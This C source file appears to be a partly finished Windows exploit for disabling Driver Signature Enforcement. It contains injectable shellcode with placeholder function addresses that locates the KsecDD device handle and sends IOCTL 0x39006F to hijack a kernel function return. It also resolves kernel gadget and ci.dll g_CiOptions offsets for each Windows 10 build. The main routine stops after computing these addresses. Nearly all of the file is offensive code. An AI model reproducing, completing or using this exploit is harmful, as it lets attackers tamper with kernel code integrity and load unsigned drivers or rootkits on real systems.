#include "dse.h"


#pragma optimize ("", off)
BOOL WINAPI LsaKsec_SendIoctl()
{
	BOOL status = FALSE;
	PIPC_SET_FUNCTION_RETURN_PARAM pIpcSetFunctionReturnParameter = 0;
	PSYSTEM_HANDLE_INFORMATION pSystemHandleInformation = 0;
	POBJECT_NAME_INFORMATION pObjectNameInformation = 0;
	POBJECT_BASIC_INFORMATION pObjectBasicInformation = 0;
	UINT64 rip = 0x2121212121212121;
	UINT64 parameter = 0x2222222222222222;
	ULONG szSystemInformationBuffer = sizeof(SYSTEM_HANDLE_INFORMATION), szObjectInformationBuffer = 0, iterator = 0;
	DWORD ObjectName[] = { 0x44446365, 0x734b5c65, 0x63697665, 0x0000445c }; // "\Device\KsecDD" --> convert to unicode before compiling !

	pObjectBasicInformation = ((PLOCALALLOC)0x3131313131313131)(LPTR, sizeof(OBJECT_BASIC_INFORMATION));

	if (((rip * 2) != 0x1090909090909090) && ((parameter * 2) != 0x1111111111111111) && (pObjectBasicInformation > 0))
	{
		pIpcSetFunctionReturnParameter = (PIPC_SET_FUNCTION_RETURN_PARAM)((PLOCALALLOC)0x3131313131313131)(LPTR, (sizeof(UINT64) * 2));
	}

	if (pIpcSetFunctionReturnParameter > 0)
	{
		pIpcSetFunctionReturnParameter->rip = rip;
		pIpcSetFunctionReturnParameter->parameter = parameter;

		while ((((PNTQUERYSYSTEMINFORMATION)0x4141414141414141)(0x10, (PVOID)pSystemHandleInformation, szSystemInformationBuffer, NULL)) != STATUS_SUCCESS)
		{
			if (pSystemHandleInformation)
			{
				((PLOCALFREE)0x3232323232323232)(pSystemHandleInformation);
				szSystemInformationBuffer *= 2;
			}
			pSystemHandleInformation = (PSYSTEM_HANDLE_INFORMATION)((PLOCALALLOC)0x3131313131313131)(LPTR, szSystemInformationBuffer);
			if (!pSystemHandleInformation)
			{
				break;
			}
		}

		if (pSystemHandleInformation)
		{
			for (iterator = 0; iterator < pSystemHandleInformation->HandleCount; iterator++)
			{
				if (pSystemHandleInformation->Handles[iterator].ProcessId == (ULONG)(*(PULONG)((PBYTE)__readgsqword(0x60) + 0x40)))
				{
					if (((PNTQUERYOBJECT)0x4242424242424242)((HANDLE)pSystemHandleInformation->Handles[iterator].Handle, ObjectBasicInformation, (PVOID)pObjectBasicInformation, sizeof(OBJECT_BASIC_INFORMATION), &szObjectInformationBuffer) == STATUS_SUCCESS)
					{
						if (!pObjectBasicInformation->NameInformationLength)
							szObjectInformationBuffer = MAX_PATH * sizeof(WCHAR);
						else
							szObjectInformationBuffer = pObjectBasicInformation->NameInformationLength;

						pObjectNameInformation = ((PLOCALALLOC)0x3131313131313131)(LPTR, (SIZE_T)pObjectNameInformation);
						if (pObjectNameInformation)
						{
							((PNTQUERYOBJECT)0x4242424242424242)((HANDLE)pSystemHandleInformation->Handles[iterator].Handle, 1, (PVOID)pObjectNameInformation, szObjectInformationBuffer, &szObjectInformationBuffer);
							if (((PWCSCMP)0x3333333333333333)((wchar_t*)pObjectNameInformation->Name.Buffer, (wchar_t*)ObjectName) == 0)
							{
								status = ((PDEVICEIOCONTROL)0x4343434343434343)((HANDLE)pSystemHandleInformation->Handles[iterator].Handle, 0x39006F, (LPVOID)pIpcSetFunctionReturnParameter, 16, NULL, 0, NULL, NULL);
								if (status)
								{
									break;
								}
							}
						}
					}
				}
			}
			if (pObjectNameInformation)
			{
				((PLOCALFREE)0x3232323232323232)(pObjectNameInformation);
			}
			((PLOCALFREE)0x3232323232323232)(pSystemHandleInformation);
		}
		((PLOCALFREE)0x3232323232323232)(pIpcSetFunctionReturnParameter);
	}
	if (pObjectBasicInformation)
	{
		((PLOCALFREE)0x3232323232323232)(pObjectBasicInformation);
	}

	return status;

}
BOOL WINAPI LsaKsec_SendIoctl_end()
{
	return 0;
}
#pragma optimize ("", on)

WINDOWS_VERSION GetOsBuildNumber()
{
	NTSTATUS status = 0;
	WINDOWS_VERSION iVersion = WINDOWS_UNSUPPORTED;
	RTL_OSVERSIONINFOW RtlOSVersion = { 0 };
	PRTLGETVERSION RtlGetVersion = 0;
	HMODULE hModule = 0;

	hModule = GetModuleHandle(L"ntdll.dll");
	if (hModule)
	{
		RtlGetVersion = (PRTLGETVERSION)GetProcAddress(hModule, "RtlGetVersion");
		if (RtlGetVersion)
		{
			RtlOSVersion.dwOSVersionInfoSize = sizeof(RtlOSVersion);
			status = RtlGetVersion(&RtlOSVersion);

			if ((status == STATUS_SUCCESS) && (RtlOSVersion.dwMajorVersion == 10))
			{
				switch (RtlOSVersion.dwBuildNumber)
				{
				case 14393:
					iVersion = WINDOWS_REDSTONE_1;
					break;

				case 15063:
					iVersion = WINDOWS_REDSTONE_2;
					break;

				case 16299:
					iVersion = WINDOWS_REDSTONE_3;
					break;

				case 17134:
					iVersion = WINDOWS_REDSTONE_4;
					break;

				case 17763:
					iVersion = WINDOWS_REDSTONE_5;
					break;

				case 18362:
					iVersion = WINDOWS_19H1;
					break;

				case 18363:
					iVersion = WINDOWS_19H2;
					break;

				case 19041:
					iVersion = WINDOWS_20H1;
					break;

				case 19042:
					iVersion = WINDOWS_20H2;
					break;

				case 19043:
					iVersion = WINDOWS_21H1;
					break;

				case 19044:
					iVersion = WINDOWS_21H2;
					break;

				case 19045:
					iVersion = WINDOWS_22H2;
					break;

				default:
					iVersion = WINDOWS_UNSUPPORTED;
					break;
				}
			}

			SecureZeroMemory(&RtlOSVersion, sizeof(RTL_OSVERSIONINFOW));
		}
	}

	return iVersion;

}

LPVOID GetDriverBaseAddress(LPSTR DeviceDriverName)
{
	LPVOID tmp_array = 0;
	LPVOID result = 0;
	DWORD needed = 0, needed2 = 0;
	DWORD64 i = 0;
	char name[MAX_PATH];
	int j = 0;

	EnumDeviceDrivers(tmp_array, 0, &needed);
	if (needed > 0)
	{
		tmp_array = (LPVOID)LocalAlloc(LPTR, (SIZE_T)needed);
		if (tmp_array)
		{
			if (EnumDeviceDrivers(tmp_array, needed, &needed2))
			{
				for (i = 0; i < needed / sizeof(LPVOID); i++)
				{
					GetDeviceDriverBaseNameA(*(PVOID*)(PVOID*)((PBYTE)tmp_array + (8 * i)), name, MAX_PATH);
					if (_stricmp(name, DeviceDriverName) == 0)
					{
						RtlCopyMemory(&result, (PBYTE)tmp_array + (8 * i), sizeof(LPVOID));
						break;						
					}
				}
			}
			//SecureZeroMemory(&tmp_array, (SIZE_T)needed);
			LocalFree(tmp_array);
		}
	}

	return result;

}

int main()
{
	WINDOWS_VERSION windows_version = WINDOWS_UNSUPPORTED;
	LPVOID RemoteAlloc = 0;
	UINT64 ntoskrnl_gadget = 0;
	UINT64 ci_g_cioptions = 0;
	HMODULE ntdll = 0;
	ULONG return_length = 0, szSystemInformationBuffer = sizeof(SYSTEM_HANDLE_INFORMATION), szObjectInformationBuffer = 0;
	DWORD i = 0;
	
	windows_version = GetOsBuildNumber();
	if (windows_version == WINDOWS_UNSUPPORTED)
	{
		return 0;
	}

	ntoskrnl_gadget = (PUINT64)GetDriverBaseAddress("ksecdd.sys") + NTOSKRNL_GADGET_OFFSET[windows_version];
	ci_g_cioptions = (PUINT64)GetDriverBaseAddress("ci.dll") + CI_G_CI_OPTIONS_OFFSET[windows_version];
	

	

	return 0;
}




/*
* 
* 
* PSYSTEM_HANDLE_INFORMATION pSystemHandleInformation = 0;
	POBJECT_NAME_INFORMATION pObjectNameInformation = 0;
	OBJECT_BASIC_INFORMATION objectBasicInformation = { 0 };
	WINDOWS_VERSION windows_version = WINDOWS_UNSUPPORTED;
	UINT64 ntoskrnl_gadget = 0;
	UINT64 ci_g_cioptions = 0;
	HMODULE ntdll = 0;
	ULONG return_length = 0, szSystemInformationBuffer = sizeof(SYSTEM_HANDLE_INFORMATION), szObjectInformationBuffer = 0;
	DWORD i = 0;

while (NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)0x10, (PVOID)pSystemHandleInformation, szSystemInformationBuffer, NULL) != STATUS_SUCCESS)
	{
		if (pSystemHandleInformation)
		{
			LocalFree(pSystemHandleInformation);
			szSystemInformationBuffer *= 2;
		}

		pSystemHandleInformation = (PSYSTEM_HANDLE_INFORMATION)LocalAlloc(LPTR, (SIZE_T)szSystemInformationBuffer);
		if (!pSystemHandleInformation)
		{
			break;
		}

	}


	if (pSystemHandleInformation)
	{
		for (i = 0; i < pSystemHandleInformation->HandleCount; i++)
		{
			if (pSystemHandleInformation->Handles[i].ProcessId == (ULONG)GetCurrentProcessId())
			{
				if (NtQueryObject((HANDLE)pSystemHandleInformation->Handles[i].Handle, ObjectBasicInformation, &objectBasicInformation, sizeof(OBJECT_BASIC_INFORMATION), &szObjectInformationBuffer) == STATUS_SUCCESS)
				{
					if (!objectBasicInformation.NameInformationLength)
						szObjectInformationBuffer = MAX_PATH * sizeof(WCHAR);
					else
						szObjectInformationBuffer = objectBasicInformation.NameInformationLength;

					pObjectNameInformation = (POBJECT_NAME_INFORMATION)LocalAlloc(LPTR, szObjectInformationBuffer);
					NtQueryObject((HANDLE)pSystemHandleInformation->Handles[i].Handle, 1, pObjectNameInformation, szObjectInformationBuffer, &szObjectInformationBuffer);
					if (pObjectNameInformation->Name.Buffer != NULL)
					{
						printf("0x%-016p\t: %ws\n", (PVOID)pSystemHandleInformation->Handles[i].Handle, pObjectNameInformation->Name.Buffer);
					}

					SecureZeroMemory(&objectBasicInformation, sizeof(OBJECT_BASIC_INFORMATION));
					LocalFree(pObjectNameInformation);
				}
			}
		}

		LocalFree(pSystemHandleInformation);

	}


*/